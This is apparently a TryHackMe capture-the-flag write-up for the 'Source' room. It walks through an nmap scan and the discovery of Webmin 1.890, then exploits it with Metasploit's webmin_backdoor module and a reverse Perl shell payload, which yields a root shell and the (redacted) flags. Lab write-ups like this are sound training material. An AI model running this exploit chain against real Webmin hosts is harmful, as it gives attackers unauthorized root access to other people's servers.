# Source [THM](https://tryhackme.com/room/source)

Let see what this box has

```bash
nmap -sV -A -T4 -Pn 10.10.93.8

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 18:19 GMT
Nmap scan report for 10.10.93.8
Host is up (0.043s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.43 seconds
```

Let visit the `webmin httpd`

```bash
curl http://10.10.93.8:10000/

<h1>Error - Document follows</h1>
<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-93-8.eu-west-1.compute.internal:10000/'>https://ip-10-10-93-8.eu-west-1.compute.internal:10000/</a> instead.<br></p>
```

Let's add this host to our /etc/hosts

```bash
echo "10.10.93.8 source.thm" | sudo tee -a /etc/hosts

10.10.93.8 source.thm
```

Now we are able to curl the site (while ignoring ssl securities)

```bash
curl --insecure https://source.thm:10000/

<!DOCTYPE HTML>
<html data-background-style="gainsboro" class="session_login">
<head>
 <noscript> <style> html[data-background-style="gainsboro"] { background-color: #d6d6d6; } html[data-background-style="nightRider"] { background-color: #1a1c20; } html[data-background-style="nightRider"] div[data-noscript] { color: #979ba080; } html[data-slider-fixed='1'] { margin-right: 0 !important; } body > div[data-noscript] ~ * { display: none !important; } div[data-noscript] { visibility: hidden; animation: 2s noscript-fadein; animation-delay: 1s; text-align: center; animation-fill-mode: forwards; } @keyframes noscript-fadein { 0% { opacity: 0; } 100% { visibility: visible; opacity: 1; } } </style> <div data-noscript> <div class="fa fa-3x fa-exclamation-triangle margined-top-20 text-danger"></div> <h2>JavaScript is disabled</h2> <p>Please enable javascript and refresh the page</p> </div> </noscript>
<meta charset="utf-8">
<title>Login to Webmin</title>
<link rel="shortcut icon" href="/images/favicon-webmin.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="/unauthenticated/css/bundle.min.css?1919999999999911" rel="stylesheet">
<script>setTimeout(function(){var a=document.querySelectorAll('input[type="password"]');i=0;
for(length=a.length;i<length;i++){var b=document.createElement("span"),d=30<a[i].offsetHeight?1:0;b.classList.add("input_warning_caps");b.setAttribute("title","Caps Lock");d&&b.classList.add("large");a[i].classList.add("use_input_warning_caps");a[i].parentNode.insertBefore(b,a[i].nextSibling);a[i].addEventListener("blur",function(){this.nextSibling.classList.remove("visible")});a[i].addEventListener("keydown",function(c){"function"===typeof c.getModifierState&&((state=20===c.keyCode?!c.getModifierState("CapsLock"):
c.getModifierState("CapsLock"))?this.nextSibling.classList.add("visible"):this.nextSibling.classList.remove("visible"))})};},100);function spinner() {var x = document.querySelector('.fa-sign-in:not(.invisible)'),s = '<span class="cspinner_container"><span class="cspinner"><span class="cspinner-icon white small"></span></span></span>';if(x){x.classList.add("invisible"); x.insertAdjacentHTML('afterend', s);x.parentNode.classList.add("disabled");x.parentNode.disabled=true}}</script> <link href="/unauthenticated/css/fonts-roboto.min.css?1919999999999911" rel="stylesheet">
</head>
<body class="session_login">
<div class="container session_login" data-dcontainer="1">

<form method="post" target="_top" action="/session_login.cgi" class="form-signin session_login clearfix" role="form" onsubmit="spinner()">
<i class="wbm-webmin"></i><h2 class="form-signin-heading">
     <span>Webmin</span></h2>
<p class="form-signin-paragraph">You must enter a username and password to login to the server on<strong> source.thm</strong></p>
<div class="input-group form-group">
<span class="input-group-addon"><i class="fa fa-fw fa-user"></i></span>
<input type="text" class="form-control session_login" name="user" autocomplete="off" autocapitalize="none" placeholder="Username"  autofocus>
</div>
<div class="input-group form-group">
<span class="input-group-addon"><i class="fa fa-fw fa-lock"></i></span>
<input type="password" class="form-control session_login" name="pass" autocomplete="off" placeholder="Password"  >
</div>
<div class="input-group form-group">
            <span class="awcheckbox awobject"><input class="iawobject" name="save" value="1" id="save" type="checkbox"> <label class="lawobject" for="save">Remember me</label></span>
         </div>
<div class="form-group form-signin-group"><button class="btn btn-primary" type="submit"><i class="fa fa-sign-in"></i>&nbsp;&nbsp;Sign in</button>
</div></form>
</div>
</body>
</html>
```

We have reached the Admin page of webmin.

Thanks to nmap we have the Webmin version `10000/tcp open  http    MiniServ 1.890 (Webmin httpd)`

Checking the vuln database returns a hit (a script for Metasploit)

```bash
searchsploit webmin 1.890
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)              | linux/webapps/47330.rb
--------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let start Metasploit

```bash
msfconsole

Metasploit tip: Use sessions -1 to interact with the 
last opened session

msf6 > search webmin 1.890

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/linux/http/webmin_backdoor  2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_backdoor

msf6 > use 0
[*] Using configured payload cmd/unix/reverse_perl

msf6 exploit(linux/http/webmin_backdoor) > options

Module options (exploit/linux/http/webmin_backdoor):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Unix In-Memory)
                                                          
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.93.8                                             
RHOSTS => 10.10.93.8                                                                                         
                                                         
msf6 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!                                              
ssl => true

msf6 exploit(linux/http/webmin_backdoor) > set LHOST tun0
LHOST => XXXXXXXXXXXX

msf6 exploit(linux/http/webmin_backdoor) > run

[*] Started reverse TCP handler on XXXXXXXXXXX:4444 
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (XXXXXXXXXX:4444 -> 10.10.93.8:47960) at 2020-12-27 19:21:46 +0000

id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
THM{XXXXXXXXXXXXXXXXXXXX}

ls -ail /home
total 12
131073 drwxr-xr-x  3 root root 4096 Jun 26  2020 .
     2 drwxr-xr-x 24 root root 4096 Jun 26  2020 ..
265534 drwxr-xr-x  5 dark dark 4096 Jun 26  2020 dark

cat /home/dark/user.txt
THM{XXXXXXXXXXXXXXXXXXXX}
```

